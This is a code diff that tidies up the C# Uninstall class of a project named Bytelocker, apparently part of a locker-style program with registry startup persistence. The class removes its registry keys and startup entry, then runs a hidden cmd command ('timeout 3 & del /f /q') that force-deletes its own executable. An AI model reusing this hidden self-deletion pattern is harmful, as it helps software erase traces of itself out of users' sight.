@@ -1,41 +1,38 @@
-﻿using Bytelocker.Settings;
-using System;
+﻿using System;
 using System.Diagnostics;
+using Bytelocker.Settings;
 
 namespace Bytelocker.Installer
 {
-    class Uninstall
+    internal class Uninstall
     {
-        RegistryManager rm;
+        private readonly RegistryManager rm;
 
         public Uninstall()
         {
-            this.rm = new RegistryManager();
-            this.DeleteRegChanges();
-            this.Delete();
-            this.RemoveFromStartup();
+            rm = new RegistryManager();
+            DeleteRegChanges();
+            Delete();
+            RemoveFromStartup();
 
-            System.Environment.Exit(0);
+            Environment.Exit(0);
         }
 
         private void DeleteRegChanges()
         {
-            RegistryManager rm = new RegistryManager();
+            var rm = new RegistryManager();
             rm.DeleteMainKey();
         }
 
         private void Delete()
         {
-            ProcessStartInfo psi = new ProcessStartInfo();
-            String path = this.rm.getStartupPath(Persistence.REGISTRY_STARTUP_VALUE_NAME);
+            var psi = new ProcessStartInfo();
+            var path = rm.getStartupPath(Persistence.REGISTRY_STARTUP_VALUE_NAME);
 
             if (path == "none")
-            {
-                psi.Arguments = "/C timeout 3 & del /f /q \"" + System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName + "\"";
-            } else
-            {
+                psi.Arguments = "/C timeout 3 & del /f /q \"" + Process.GetCurrentProcess().MainModule.FileName + "\"";
+            else
                 psi.Arguments = "/C timeout 3 & del /f /q \"" + path + "\"";
-            }
 
             psi.WindowStyle = ProcessWindowStyle.Hidden;
             psi.CreateNoWindow = true;
@@ -46,7 +43,7 @@ namespace Bytelocker.Installer
 
         private void RemoveFromStartup()
         {
-            this.rm.RemoveFromStartup(Persistence.REGISTRY_STARTUP_VALUE_NAME);
+            rm.RemoveFromStartup(Persistence.REGISTRY_STARTUP_VALUE_NAME);
         }
     }
 }
